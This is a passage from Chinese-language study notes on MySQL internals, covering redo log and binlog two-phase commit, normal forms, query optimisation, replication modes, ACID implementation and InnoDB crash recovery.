<li>执行器收到通知后<strong>记录<code>binlog</code>,然后调用引擎接口，提交<code>redo log</code>为提交状态</strong></li>
<li>更新完成</li>
</ul>
<h2 id="为什么要用两个日志模块？"><a href="#为什么要用两个日志模块？" class="headerlink" title="为什么要用两个日志模块？"></a>为什么要用两个日志模块？</h2><p>这是因为最开始 MySQL 并没与 InnoDB 引擎( InnoDB 引擎是其他公司以插件形式插入 MySQL 的) ，MySQL 自带的引擎是 MyISAM，但是<code>redo log</code>是 InnoDB 引擎特有的，其他存储引擎都没有，这就导致会没有<code>crash-safe</code>的能力(<code>crash-safe</code>的能力指的是即使数据库发生异常重启，之前提交的记录都不会丢失)，<code>binlog</code>日志只能用来归档,而InnoDB引擎就是通过<code>redo log</code>来支持事务的。</p>
<h2 id="为什么要先写redo-log，再写bin-log，最后再写一个redo-log？"><a href="#为什么要先写redo-log，再写bin-log，最后再写一个redo-log？" class="headerlink" title="为什么要先写redo log，再写bin log，最后再写一个redo log？"></a>为什么要先写redo log，再写bin log，最后再写一个redo log？</h2><ul>
<li>**假设先写<code>redo log</code>直接提交，然后写<code>binlog</code>**：如果写完<code>redo log</code>之后，机器挂了，<code>binlog</code>日志没有被写入，那么机器重启后，这台机器会通过<code>redo log</code>恢复数据，但是这个时候<code>bin log</code>并没有记录该数据，后续进行机器备份的时候，就会丢失这一条数据，同时主从同步也会丢失这一条数据</li>
<li>**假设先写<code>bin log</code>,然后写<code>redo log</code>**：写完了<code>binlog</code>，如果这时候机器异常重启了，由于没有<code>redo log</code>，本机是无法恢复这一条数据的，但是<code>bin log</code>又有记录，那么就同样会产生数据不一致的情况。</li>
</ul>
<p>如果采用<code>redo log</code>两个阶段提交的方式就不一样了，写完了<code>bin log</code>之后，然后再提交<code>redo log</code>就可以防止出现上述的问题，从而保证了数据的一致性。</p>
<p>假设<code>redo log</code>处于预提交状态，<code>bin log</code>也已经写完了，这个时候如果发生了异常重启，就需要依赖于MySQL的处理机制了，MySQL的处理过程如下：</p>
<ul>
<li>判断<code>redo log</code>是否完整，如果判断是完整的，就立即提交</li>
<li>如果<code>redo log</code>只是预提交但不是<code>commit</code>状态，这个时候就会去判断<code>binlog</code>是否完整，如果完整就提交<code>redo log</code>,不完整就回滚事务。</li>
</ul>
<p>这就解决了数据一致性问题。</p>
<h1 id="26-函数依赖"><a href="#26-函数依赖" class="headerlink" title="26. 函数依赖"></a>26. 函数依赖</h1><p>记<code>A-&gt;B</code>表示A函数决定B函数，也就是说B函数依赖于A函数。</p>
<p>如果<code>&#123;A1,A2,...,An&#125;</code>是关系的一个或多个属性的集合，该集合函数决定了关系的其他所有属性并且是最小的，那么该集合就称为<strong>键码</strong>。</p>
<p>对于<code>A-&gt;B</code>,如果能找到A的真子集A’，使得<code>A&#39;-&gt;B</code>,那么<code>A-&gt;B</code>就是部分函数依赖，否则就是完全函数依赖。</p>
<p>对于<code>A-&gt;B,B-&gt;C</code>,则<code>A-&gt;C</code>是一个传递函数依赖。</p>
<h1 id="27-三大范式"><a href="#27-三大范式" class="headerlink" title="27. 三大范式"></a>27. 三大范式</h1><p>三大范式是用来优化数据库数据存储方式的三大规范。</p>
<p>高级别范式的依赖于低级别的范式，<code>1NF</code>是最低级别的范式。</p>
<ul>
<li><strong>第一范式（1NF）</strong>：当关系模式 R 的所有属性都不能再分解为更基本的数据单位时，称 R 是满足第一范式的，简记为 <code>1NF</code>。第一范式强调的是列的原子性，即列不能够再分成其它几列。满足第一范式是关系模式规范化的最低要求，否则，将有很多基本操作在这样的关系模式中实现不了。</li>
<li><strong>第二范式（2NF）</strong>：如果关系模式 R 满足第一范式，并且 R 的所有非主属性都完全依赖于 R 的每一个候选关键属性，称 R 满足第二范式，简记为<code>2NF</code>。也就是说，要求表中的所有列，都必须依赖于主键，而不能有任何一列与主键没有关系，也就是说一个表只描述一件事情。<br>例如：订单表只描述订单相关的信息，所以所有字段都必须与订单id相关，产品表只描述产品相关的信息，所以所有字段都必须与产品id相关；因此不能在一张表中同时出现订单信息与产品信息。</li>
<li><strong>第三范式（3NF）</strong>：在第二范式的基础上更上一层，目标是确保每列都和主键列直接相关,而不是间接相关(另外非主键列必须直接依赖于主键，<strong>不能存在传递依赖</strong>)，要求字段不能有冗余，任何字段不能由其他字段派生。<br>例如：订单表中需要有客户相关信息，在分离出客户表之后，订单表中只需要有一个用户 id 即可（外键），而不能有其他的客户信息。因为其他的客户信息直接关联于用户 id，而不是直接与订单 id 直接相关。</li>
<li><strong>BC范式（BCNF）</strong>：主属性不依赖于主属性。在第三范式的基础上，数据库表中如果不存在任何字段对任一候选关键字段的传递函数依赖则符合 BCNF 范式。或者指在第三范式的基础上进一步消除主属性对于码的部分函数依赖和传递依赖。</li>
<li><strong>第四范式（4NF）</strong>：要求把同一表内的多对多关系删除</li>
<li><strong>第五范式（5NF）</strong>：从最终结构建立原始结构</li>
</ul>
<p>如果不符合范式的关系，就会产生很多异常，主要有以下四种异常：</p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">Sname</th>
<th align="left">Sdept</th>
<th align="left">Mname</th>
<th align="left">Cname</th>
<th align="left">Grade</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">学生-1</td>
<td align="left">学院-1</td>
<td align="left">院长-1</td>
<td align="left">课程-1</td>
<td align="left">90</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">学生-2</td>
<td align="left">学院-2</td>
<td align="left">院长-2</td>
<td align="left">课程-2</td>
<td align="left">80</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">学生-2</td>
<td align="left">学院-2</td>
<td align="left">院长-2</td>
<td align="left">课程-1</td>
<td align="left">100</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">学生-3</td>
<td align="left">学院-2</td>
<td align="left">院长-2</td>
<td align="left">课程-2</td>
<td align="left">95</td>
</tr>
</tbody></table>
<ul>
<li><strong>冗余数据</strong>：例如<code>学生-2</code>出现了两次</li>
<li><strong>修改异常</strong>：修改了一个记录中的信息，但是另一个记录中相同的信息却没有修改。</li>
<li><strong>删除异常</strong>：删除了一个信息，那么也会丢失其他信息。例如删除了<code>课程-1</code>需要删除第一行和第三行，那么<code>学生-1</code>的信息就会丢失。</li>
<li><strong>插入异常</strong>：例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入。</li>
</ul>
<h1 id="28-查询性能优化"><a href="#28-查询性能优化" class="headerlink" title="28. 查询性能优化"></a>28. 查询性能优化</h1><h2 id="使用Explain进行分析"><a href="#使用Explain进行分析" class="headerlink" title="使用Explain进行分析"></a>使用Explain进行分析</h2><p>Explain用来分析<code>SELECT</code>查询语句，使用方法就是在查询语句前面使用<code>explain</code>修饰，开发人员可以通过分析<code>Explain</code>结果来优化查询语句</p>
<p>返回结果中比较重要的字段有：</p>
<ul>
<li><code>select_type</code>：查询类型，有简单查询、联合查询、子查询</li>
<li><code>key</code>：使用的索引</li>
<li><code>rows</code>：扫描的行数</li>
</ul>
<h2 id="优化数据访问"><a href="#优化数据访问" class="headerlink" title="优化数据访问"></a>优化数据访问</h2><h3 id="1-减少请求的数据量"><a href="#1-减少请求的数据量" class="headerlink" title="1. 减少请求的数据量"></a>1. 减少请求的数据量</h3><ul>
<li>只返回必要的列：最好不要使用<code>SELECT *</code>语句</li>
<li>只返回必要的行：使用<code>LIMIT</code>语句来限制返回的数据</li>
<li>缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升将会是非常明显的。</li>
</ul>
<h3 id="2-减少服务器端扫描的行数"><a href="#2-减少服务器端扫描的行数" class="headerlink" title="2. 减少服务器端扫描的行数"></a>2. 减少服务器端扫描的行数</h3><p>最有效的方式是使用索引来覆盖查询</p>
<h2 id="重构查询方式"><a href="#重构查询方式" class="headerlink" title="重构查询方式"></a>重构查询方式</h2><h3 id="1-切分大查询"><a href="#1-切分大查询" class="headerlink" title="1. 切分大查询"></a>1. 切分大查询</h3><p>一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE FROM messages WHERE create &lt; DATA_SUB(NOW(),INTERVAL 3 MONTH);</span><br><span class="line">rows_affected &#x3D; 0;</span><br><span class="line">do&#123;</span><br><span class="line">    rows_affected &#x3D; do_query(</span><br><span class="line">    &quot;DELETE FROM messages WHERE create &lt; DATE_SUB(NOW(),INTERVAL 3 MONTH) LIMIT 10000&quot;)</span><br><span class="line">&#125;while rows_affected &gt; 0;</span><br></pre></td></tr></table></figure>

<h3 id="2-分解大连接查询"><a href="#2-分解大连接查询" class="headerlink" title="2. 分解大连接查询"></a>2. 分解大连接查询</h3><p>将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：</p>
<ul>
<li>让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。</li>
<li>分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。</li>
<li>减少锁竞争；</li>
<li>在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。</li>
<li>查询本身效率也可能会有所提升。</li>
</ul>
<h1 id="29-CHAR和VARCHAR的区别"><a href="#29-CHAR和VARCHAR的区别" class="headerlink" title="29. CHAR和VARCHAR的区别"></a>29. CHAR和VARCHAR的区别</h1><p>char 表示定长，长度固定，varchar表示变长，即长度可变。</p>
<ul>
<li><p>char如果插入的长度小于定义长度时，则用空格填充；</p>
</li>
<li><p>varchar小于定义长度时，还是按实际长度存储，插入多长就存多长。</p>
</li>
</ul>
<p>因为其长度固定，char的存取速度还是要比varchar要快得多，方便程序的<strong>存储与查找</strong>；但是char也为此付出的是空间的代价，因为其长度固定，所以会占据多余的空间，可谓是以空间换取时间效率。varchar则刚好相反，以时间换空间。</p>
<p>当超出一个页所能容纳的大小时，char会将多的字段截断，varchar就需要执行额外的操作。</p>
<p><code>MyISAM</code>会将行拆成不同的片段存储，而InnoDB则需要分裂页来使行放入页内。</p>
<h1 id="30-主从复制"><a href="#30-主从复制" class="headerlink" title="30. 主从复制"></a>30. 主从复制</h1><h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p>主要涉及三个线程：<code>binlog</code>线程、I/O 线程和SQL线程</p>
<ul>
<li><strong>主节点 bin log dump 线程</strong>：负责将主服务器上的数据更改写入二进制日志（<code>Binary log</code>）中。当从节点连接主节点时，主节点会创建一个 log dump 线程，用于发送 bin-log 的内容。在读取 bin-log 中的操作时，此线程会对主节点上的 bin-log 加锁，当读取完成，甚至在发送给从节点之前，锁会被释放。</li>
<li><strong>从节点 I/O 线程</strong>：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（<code>Relay log</code>）。当从节点上执行 <code>start slave</code> 命令之后，从节点会创建一个 I/O 线程用来连接主节点，请求主库中更新的 bin-log。I/O线程接收到主节点 binlog dump 进程发来的更新之后，保存在本地 relay-log 中。</li>
<li><strong>从节点 SQL 线程</strong>：负责读取中级日志，解析出主服务器已经执行的数据更改并在从服务器中重放(<code>Replay</code>)。SQL线程负责读取 relay log 中的内容，解析成具体的操作并执行，最终保证主从数据的一致性。</li>
</ul>
<p><img src="https://github.com/CyC2018/CS-Notes/raw/master/notes/pics/master-slave.png" alt="主从复制"></p>
<p>对于每一个主从连接，都需要三个进程来完成。当主节点有多个从节点时，主节点会为每一个当前连接的从节点建一个binary log dump 进程，而每个从节点都有自己的I/O进程，SQL进程。从节点用两个线程将从主库拉取更新和执行分成独立的任务，这样在执行同步数据任务的时候，不会降低读操作的性能。比如，如果从节点没有运行，此时I/O进程可以很快从主节点获取更新，尽管SQL进程还没有执行。如果在SQL进程执行之前从节点服务停止，至少I/O进程已经从主节点拉取到了最新的变更并且保存在本地relay日志中，当服务再次起来之后，就可以完成数据的同步。</p>
<p>要实施复制，首先必须打开 Master 端的 binary log（bin-log） 功能，否则无法实现。</p>
<p>因为整个复制过程实际上就是 Slave 从 Master 端获取该日志然后再在自己身上完全顺序的执行日志中所记录的各种操作。</p>
<p>复制的基本过程如下：</p>
<ol>
<li>从节点上的I/O 进程连接主节点，并请求从指定日志文件的指定位置（或者从最开始的日志）之后的日志内容；</li>
<li>主节点接收到来自从节点的 I/O 请求后，通过负责复制的 I/O 进程根据请求信息读取指定日志指定位置之后的日志信息，返回给从节点。返回信息中除了日志所包含的信息之外，还包括本次返回的信息的 bin-log file 的以及 bin-log position；从节点的 I/O 进程接收到内容后，将接收到的日志内容更新到本机的 relay log 中，并将读取到的 binary log 文件名和位置保存到 master-info 文件中，以便在下一次读取的时候能够清楚的告诉 Master “我需要从某 bin-log 的哪个位置开始往后的日志内容，请发给我”；</li>
<li>Slave 的 SQL 线程检测到 relay-log 中新增加了内容后，会将 relay-log 的内容解析成在祝节点上实际执行过的操作，并在本数据库中执行。</li>
</ol>
<h3 id="MySQL-主从复制的模式"><a href="#MySQL-主从复制的模式" class="headerlink" title="MySQL 主从复制的模式"></a>MySQL 主从复制的模式</h3><p>MySQL 主从复制默认是异步的模式。MySQL 增删改操作会全部记录在 binary log 中，当 slave 节点连接 master 时，会主动从 master 处获取最新的 bin log 文件。</p>
<h4 id="异步模式（mysql-async-mode）"><a href="#异步模式（mysql-async-mode）" class="headerlink" title="异步模式（mysql async-mode）"></a>异步模式（mysql async-mode）</h4><p>异步模式如下图所示，这种模式下，主节点不会主动 push bin log 到从节点，这样有可能导致 failover 的情况下，也许从节点没有即时地将最新的 bin log 同步到本地。</p>
<p><img src="https://pic1.zhimg.com/80/v2-c15bfffe3e398eafc7e0ffdaeebfcaac_hd.jpg" alt="异步模式"></p>
<h4 id="半同步模式-mysql-semi-sync"><a href="#半同步模式-mysql-semi-sync" class="headerlink" title="半同步模式(mysql semi-sync)"></a>半同步模式(mysql semi-sync)</h4><p>这种模式下主节点只需要接收到其中一台从节点的返回信息，就会 commit；否则需要等待直到超时时间然后切换成异步模式再提交；这样做的目的可以使主从数据库的数据延迟缩小，可以提高数据安全性，确保了事务提交后，binlog 至少传输到了一个从节点上，不能保证从节点将此事务更新到 db 中。性能上会有一定的降低，响应时间会变长。如下图所示：</p>
<p><img src="https://pic2.zhimg.com/80/v2-d9ac9c5493d1d772f5bf57ede089f0d5_hd.jpg" alt="半同步模式"></p>
<p>半同步模式不是mysql内置的，从mysql 5.5开始集成，需要master 和slave 安装插件开启半同步模式。</p>
<h4 id="全同步模式"><a href="#全同步模式" class="headerlink" title="全同步模式"></a>全同步模式</h4><p>全同步模式是指主节点和从节点全部执行了 commit 并确认才会向客户端返回成功。</p>
<h3 id="复制方式"><a href="#复制方式" class="headerlink" title="复制方式"></a>复制方式</h3><p>MySQL 主从复制有三种方式：基于SQL语句的复制（statement-based replication，SBR），基于行的复制（row-based replication，RBR)，混合模式复制（mixed-based replication,MBR)。对应的 binlog 文件的格式也有三种：STATEMENT,ROW,MIXED。</p>
<ul>
<li><code>Statement-base Replication</code> (SBR) 就是记录 sql 语句在 bin log 中，Mysql 5.1.4 及之前的版本都是使用的这种复制格式。优点是只需要记录会修改数据的 sql 语句到 binlog 中，减少了 binlog 日志量，节约 I/O，提高性能。缺点是在某些情况下，会导致主从节点中数据不一致（比如sleep(),now()等）。</li>
<li><code>Row-based Relication</code> (RBR) 是 mysql master 将 SQL 语句分解为基于 Row 更改的语句并记录在 bin log 中，也就是只记录哪条数据被修改了，修改成什么样。优点是不会出现某些特定情况下的存储过程、或者函数、或者 trigger 的调用或者触发无法被正确复制的问题。缺点是会产生大量的日志，尤其是修改 table 的时候会让日志暴增,同时增加 bin log 同步时间。也不能通过 bin log 解析获取执行过的 sql 语句，只能看到发生的 data 变更。</li>
<li><code>Mixed-format Replication</code>(MBR)，MySQL NDB cluster 7.3 和7.4 使用的MBR。是以上两种模式的混合，对于一般的复制使用 STATEMENT 模式保存到 binlog，对于 STATEMENT 模式无法复制的操作则使用 ROW 模式来保存，MySQL 会根据执行的 SQL 语句选择日志保存方式。</li>
</ul>
<h4 id="GTID复制模式"><a href="#GTID复制模式" class="headerlink" title="GTID复制模式"></a>GTID复制模式</h4><p>在传统的复制里面，当发生故障，需要主从切换，需要找到binlog 和 pos 点，然后将主节点指向新的主节点，相对来说比较麻烦，也容易出错。在MySQL 5.6里面，不用再找 binlog 和 pos 点，只需要知道主节点的 ip，端口，以及账号密码就行，因为复制是自动的，MySQL会通过内部机制 GTID 自动找点同步。</p>
<p>基于GTID复制实现的工作原理</p>
<ol>
<li>主节点更新数据时，会在事务前产生 GTID，一起记录到 binlog 日志中。</li>
<li>从节点的 I/O 线程将变更的 bin log，写入到本地的 relay log 中。</li>
<li>SQL线程从 relay log 中获取GTID，然后对比本地 binlog 是否有记录（所以MySQL从节点必须要开启 binary log）。</li>
<li>如果有记录，说明该 GTID 的事务已经执行，从节点会忽略；如果没有记录，从节点就会从 relay log 中执行该 GTID 的事务，并记录到 bin log。</li>
<li>在解析过程中会判断是否有主键，如果没有就用二级索引，如果有就用全部扫描。</li>
</ol>
<p>传统模式与 GTID 对比：</p>
<ul>
<li>日志：传统的方式，默认的方式。依赖二进制日志，根据日志的偏移量。事务不断提交，二进制日志的偏移量也会不断的变化。需要从库告诉主库，自己明确复制到了偏移量的什么位置。</li>
<li>GTID: 全局事务ID，在一个集群内的一个GTID是唯一的， <code>GTID= source_id:transcation_id</code>，source_id为那一台机器上的，slave增量复制还未同步的GTID即可。</li>
</ul>
<h3 id="主从复制延迟"><a href="#主从复制延迟" class="headerlink" title="主从复制延迟"></a>主从复制延迟</h3><h4 id="产生延迟原因？"><a href="#产生延迟原因？" class="headerlink" title="产生延迟原因？"></a>产生延迟原因？</h4><ul>
<li>主节点如果执行一个很大的事务(更新千万行语句，总之执行很长时间的事务)，那么就会对主从延迟产生较大的影响</li>
<li>网络延迟，日志较大，slave 数量过多。</li>
<li>主上多线程写入，从节点只有单线程恢复</li>
</ul>
<p>处理办法：</p>
<ul>
<li>大事务：将大事务分为小事务，分批更新数据。</li>
<li>减少Slave的数量，不要超过5个，减少单次事务的大小。</li>
<li>MySQL 5.7之后，可以使用多线程复制（基于库），在MySQL 5.6以前的版本，slave 的复制是单线程的。一个事件一个事件的读取应用。而 master 是并发写入的，所以延时是避免不了的。唯一有效的方法是把多个库放在多台 slave，这样又有点浪费服务器。在 MySQL 5.6 里面，可以把多个表放在多个库，这样就可以使用多线程复制。</li>
</ul>
<h2 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h2><p>主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作</p>
<p>读写分离能提高性能的原因在于：</p>
<ul>
<li>主从服务器负责各自的读和写，极大程度缓解了锁的争用；</li>
<li>从服务器可以使用<code>MyISAM</code>，提升查询性能以及节约系统开销</li>
<li>增加冗余，提高可用性</li>
</ul>
<p>读写分离常用代理方式实现，代理服务器接收应用层传来的读写请求，然后决定发到哪个服务器</p>
<p><img src="https://github.com/CyC2018/CS-Notes/raw/master/notes/pics/master-slave-proxy.png" alt="读写分离"></p>
<h1 id="31-事务的实现原理？（ACID实现原理）"><a href="#31-事务的实现原理？（ACID实现原理）" class="headerlink" title="31. 事务的实现原理？（ACID实现原理）"></a>31. 事务的实现原理？（ACID实现原理）</h1><p>事务就有 ACID 特性，保证 ACID 特性就相当于实现了事务。</p>
<h2 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h2><p>利用Innodb的undo log。</p>
<p>undo log名为回滚日志，是实现原子性的关键，当事务回滚时能够撤销所有已经成功执行的 sql 语句，需要记录要回滚的相应日志信息。</p>
<p>例如：</p>
<ol>
<li>当 delete 一条数据的时候，就需要记录这条数据的信息，回滚的时候，insert 这条旧数据</li>
<li>当 update 一条数据的时候，就需要记录之前的旧值，回滚的时候，根据旧值执行 update 操作</li>
<li>当 insert 一条数据的时候，就需要这条记录的主键，回滚的时候，根据主键执行 delete 操作</li>
</ol>
<p>undo log 记录了这些回滚需要的信息，当事务执行失败或调用了 rollback，导致事务需要回滚，便可以利用 undo log 中的信息将数据回滚到修改之前的样子。</p>
<h2 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h2><p><strong>从数据库层面，数据库通过原子性、隔离性、持久性来保证一致性</strong>。也就是说 ACID 四大特性之中，C(一致性)是目的，A(原子性)、I(隔离性)、D(持久性)是手段，是为了保证一致性，数据库提供的手段。数据库必须要实现 AID 三大特性，才有可能实现一致性。例如，原子性无法保证，显然一致性也无法保证。</p>
<p>但是，如果你在事务里故意写出违反约束的代码，一致性还是无法保证的。例如，你在转账的例子中，你的代码里故意不给 B 账户加钱，那一致性还是无法保证。因此，还必须从应用层角度考虑。</p>
<p><strong>从应用层面，通过代码判断数据库数据是否有效，然后决定回滚还是提交数据</strong></p>
<h2 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h2><p>利用的是锁和MVCC机制。一个行记录数据有多个版本对快照数据，这些快照数据在 undo log 中。</p>
<p>如果一个事务读取的行正在做 DELELE 或者 UPDATE 操作，读取操作不会等行上的锁释放，而是读取该行的快照版本。</p>
<p>由于MVCC机制在可重复读(Repeateable Read)和读已提交(Read Commited)的MVCC表现形式不同。<br>但是有一点说明一下，在事务隔离级别为读已提交(Read Commited)时，一个事务能够读到另一个事务已经提交的数据，是不满足隔离性的。但是当事务隔离级别为可重复读(Repeateable Read)中，是满足隔离性的。</p>
<h2 id="持久性"><a href="#持久性" class="headerlink" title="持久性"></a>持久性</h2><p>是利用Innodb的redo log。</p>
<p>Mysql是先把磁盘上的数据加载到内存中，在内存中对数据进行修改，再刷回磁盘上。如果此时突然宕机，内存中的数据就会丢失。</p>
<p>怎么解决这个问题？</p>
<p>简单啊，事务提交前直接把数据写入磁盘就行啊。</p>
<p>这么做有什么问题？</p>
<p>只修改一个页面里的一个字节，就要将整个页面刷入磁盘，太浪费资源了。毕竟一个页面16kb大小，你只改其中一点点东西，就要将16kb的内容刷入磁盘，听着也不合理。</p>
<p>毕竟一个事务里的SQL可能牵涉到多个数据页的修改，而这些数据页可能不是相邻的，也就是属于随机IO。显然操作随机IO，速度会比较慢。</p>
<p>于是，决定采用 redo log 解决上面的问题。当做数据修改的时候，不仅在内存中操作，还会在 redo log 中记录这次操作。当事务提交的时候，会将 redo log 日志进行刷盘 (redo log一部分在内存中，一部分在磁盘上)。当数据库宕机重启的时候，会将 redo log 中的内容恢复到数据库中，再根据 undo log 和 binlog 内容决定回滚数据还是提交数据。</p>
<p>采用redo log的好处？</p>
<p>其实好处就是将 redo log 进行刷盘比对数据页刷盘效率高，具体表现如下</p>
<ul>
<li>redo log 体积小，毕竟只记录了哪一页修改了啥，因此体积小，刷盘快。</li>
<li>redo log 是一直往末尾进行追加，属于顺序IO。效率显然比随机IO来的快。</li>
</ul>
<h1 id="32-数据库宕机恢复过程"><a href="#32-数据库宕机恢复过程" class="headerlink" title="32. 数据库宕机恢复过程"></a>32. 数据库宕机恢复过程</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><ul>
<li>lsn: 可以理解为数据库从创建以来产生的 redo 日志量，这个值越大，说明数据库的更新越多，也可以理解为更新的时刻。此外，每个数据页上也有一个 lsn，表示最后被修改时的 lsn，值越大表示越晚被修改。比如，数据页 A 的 lsn 为100，数据页 B 的 lsn 为200，checkpoint lsn 为150，系统 lsn 为300，表示当前系统已经更新到300，小于 150 的数据页已经被刷到磁盘上，因此数据页 A 的最新数据一定在磁盘上，而数据页 B 则不一定，有可能还在内存中。</li>
<li>检查点: 英文名为 <code>checkpoint</code>。数据库为了提高性能，数据页在内存修改后并不是每次都会刷到磁盘上。checkpoint 之前的数据页保证一定落盘了，这样之前的日志就没有用了(由于InnoDB redolog 日志循环使用，这时这部分日志就可以被覆盖)，checkpoint 之后的数据页有可能落盘，也有可能没有落盘，所以 checkpoint 之后的日志在崩溃恢复的时候还是需要被使用的。InnoDB 会依据脏页的刷新情况，定期推进 checkpoint，从而减少数据库崩溃恢复的时间。检查点的信息在第一个日志文件的头部。</li>
</ul>
<h2 id="恢复过程"><a href="#恢复过程" class="headerlink" title="恢复过程"></a>恢复过程</h2><p>InnoDB 的数据恢复过程需要 redo log、binlog、undo log 等参与。把 InnoDB 的恢复过程主要划分为两个阶段：第一阶段主要依赖于 redo log 的恢复；而第二阶段，需要 binlog 和 undo log 的共同参与。</p>
<h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>第一阶段，数据库启动后，InnoDB会通过 redo log 找到最近一次 checkpoint 的位置，然后根据 checkpoint 相对应的 LSN 开始，获取需要重做的日志，接着解析获取的日志并且保存到一个哈希表中，最后通过遍历哈希表中的redo log 信息，读取相关页进行恢复。</p>
<p>InnoDB的 checkpoint 信息保存在日志文件中，即 ib_logfile0 的开始2048个字节中，checkpoint 有两个，交替更新。</p>
<p>checkpoint 信息分别保存在 ib_logfile0 的 512 字节和 1536 字节处，每个 checkpoint 默认大小为 512 字节，InnoDB 的 checkpoint 主要由3部分信息组成：</p>
<ul>
<li><code>checkpoint no</code>：主要保存的是 checkpoint 号，因为InnoDB有两个 checkpoint，通过 checkpoint 号来判断哪个 checkpoint 更新。</li>
<li><code>checkpoint lsn</code>：主要记录了产生该 checkpoint 时 flush 的LSN，确保在该 LSN 前面的数据页都已经落盘，不再需要通过 redo log 进行恢复。</li>
<li><code>checkpoint offset</code>：主要记录了该 checkpoint 产生时，redo log 在 ib_logfile 中的偏移量，通过该 offset 位置就可以找到需要恢复的 redo log 开始位置。</li>
</ul>
<p><img src="http://qiniu.xiaoming.net.cn/checkpoint%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84" alt="checkpoint结构"></p>
<p>通过以上 checkpoint 的信息，我们可以简单得到需要恢复的 redo log 的位置，然后通过顺序扫描该 redo log 来读取数据，比如我们通过 checkpoint 定位到开始恢复的redo log 位置在ib_logfile1 中的某个位置，那么整个 redo log 扫描的过程可能是这样的：</p>
<ol>
<li>从 ib_logfile1 的指定位置开始读取 redo log，每次读取 <code>4 * page_size</code> 的大小，这里我们默认页面大小为 16K，所以每次读取 64K 的 redo log 到缓存中，redo log 每条记录（block）的大小为 512 字节。</li>
<li>读取到缓存中的 redo log 通过解析、验证等一系列过程后，把 redo log 的内容部分保存到用于恢复的缓存 <code>recv_sys-&gt;buf</code>，保存到恢复缓存中的每条信息主要包含两部分：（space，offset）组成的位置信息和具体 redo log 的内容，我们称之为body。</li>
<li>同时保存在恢复缓存中的 redo 信息会根据（space，offset）计算一个哈希值后保存到一个哈希表（recv_sys-&gt;addr_hash）中，相同哈希值、不同（space，offset）用链表存储，相同的（space，offset）用列表保存，可能部分事务比较大，redo 信息一个 block 不能保存，所以，每个 body 中可以用链表链接多 body 的值。</li>
</ol>
<p>redo log 被保存到哈希表中之后，InnoDB 就可以开始进行数据恢复，只需要轮询哈希表中的每个节点获取redo信息，根据（space，offset）读取指定页面后进行日志覆盖。</p>
<h4 id="InnoDB为了保证恢复的速度，做了几点优化："><a href="#InnoDB为了保证恢复的速度，做了几点优化：" class="headerlink" title="InnoDB为了保证恢复的速度，做了几点优化："></a>InnoDB为了保证恢复的速度，做了几点优化：</h4><ul>
<li>优化1：在根据（space，offset）读取数据页信息到 buffer pool 的时候，InnoDB 不是只读取一张页面，而是读取相邻的 32 张页面到 buffer pool。这里有个假设，InnoDB认为，如果一张页面被修改了，那么其周围的一些页面很有可能也被修改了，所以一次性连续读入32张页面可以避免后续再重新读取。</li>
<li>优化2：在MySQL5.7版本以前，InnoDB恢复时需要依赖数据字典，因为InnoDB根本不知道某个具体的 space 对应的ibd文件是哪个，这些信息都是数据字典维护的。而且在恢复前，需要把所有的表空间全部打开，如果库中有数以万计的表，把所有表打开一遍，整个过程就会很慢。那么MySQL5.7在这上面做了哪些改进呢？其实很简单，针对上面的问题，InnoDB在 redo log 中增加了两种 redo log 的类型来解决。<code>MLOG_FILE_NAME</code> 用于记录在 checkpoint 之后，所有被修改过的信息（space，filepath）；<code>MLOG_CHECKPOINT</code> 则用于标志 <code>MLOG_FILE_NAME</code> 的结束。</li>
</ul>
<p>上面两种redo log类型的添加，完美解决了前面遗留的问题，redo log 中保存了后续需要恢复的 space 和 filepath 对。所以，在恢复的时候，只需要从 checkpoint 的位置一直往后扫描到 <code>MLOG_CHECKPOINT</code> 的位置，这样就能获取到需要恢复的 space 和 filepath。在恢复过程中，只需要打开这些ibd文件即可。当然由于 space 和 filepath 的对应关系通过 redo 存了下来，恢复的时候也不再依赖数据字典。</p>
<p>这里需要强调的是 MLOG_CHECKPOINT 在每个 checkpoint 点中最多存在一次，如果出现多次 MLOG_CHECKPOINT 类型的日志，则说明 redo 已经损坏，InnoDB 会报错。</p>
<p>最多存在一次，那么会不会有不存在的情况？</p>
<p>答案是肯定的，在每次checkpoint过后，如果没有发生数据更新，那么 MLOG_CHECKPOINT 就不会被记录。所以只要查找下 redo log 最新一个 checkpoint 后的 MLOG_CHECKPOINT 是否存在，就能判定上次MySQL是否正常关机。</p>
<p>5.7版本的MySQL在InnoDB进行恢复的时候，也正是这样做的，MySQL5.7在进行恢复的时候，一般情况下需要进行最多3次的redo log扫描：</p>
<ol>
<li>首先对redo log的扫描，主要是为了查找 MLOG_CHECKPOINT，这里并不进行 redo log的解析。如果没有找到 MLOG_CHECKPOINT，则说明 InnoDB 不需要进行 recovery，后面的两次扫描可以省略；如果找到了 MLOG_CHECKPOINT，则获取 MLOG_FILE_NAME 到指定列表，后续只需打开该链表中的表空间即可。</li>
